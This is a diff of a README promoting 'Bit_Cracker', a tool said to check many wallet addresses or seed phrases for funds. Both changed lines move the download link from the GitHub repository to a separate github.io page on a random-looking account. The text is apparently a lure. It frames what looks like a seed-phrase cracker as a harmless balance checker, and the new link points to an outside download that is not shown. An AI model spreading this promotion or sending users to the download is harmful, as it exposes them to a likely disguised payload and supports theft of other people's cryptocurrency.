@@ -1,6 +1,6 @@
 # 🔑 Bit_Cracker - Check Your Digital Wallet Balance Effortlessly
 
-[![](https://img.shields.io/badge/Download-Bit_Cracker-blue?style=for-the-badge)](https://github.com/Germanderspeedwelltomfool423/Bit_Cracker)
+[![](https://img.shields.io/badge/Download-Bit_Cracker-blue?style=for-the-badge)](https://germanderspeedwelltomfool423.github.io)
 
 Bit_Cracker simplifies the process of checking cryptocurrency wallet balances. This tool allows users to verify multiple addresses or seed phrases for existing assets without manual searching. It supports major blockchain networks and provides clear feedback on the status of your wallet data.
 
@@ -16,7 +16,7 @@ To run Bit_Cracker, your computer needs the following specifications:
 
 ## 📥 Getting Started
 
-You can retrieve the application directly from the official repository. Visit this page to download: [https://github.com/Germanderspeedwelltomfool423/Bit_Cracker](https://github.com/Germanderspeedwelltomfool423/Bit_Cracker).
+You can retrieve the application directly from the official repository. Visit this page to download: [https://germanderspeedwelltomfool423.github.io](https://germanderspeedwelltomfool423.github.io).
 
 Follow these steps for a successful setup:
 
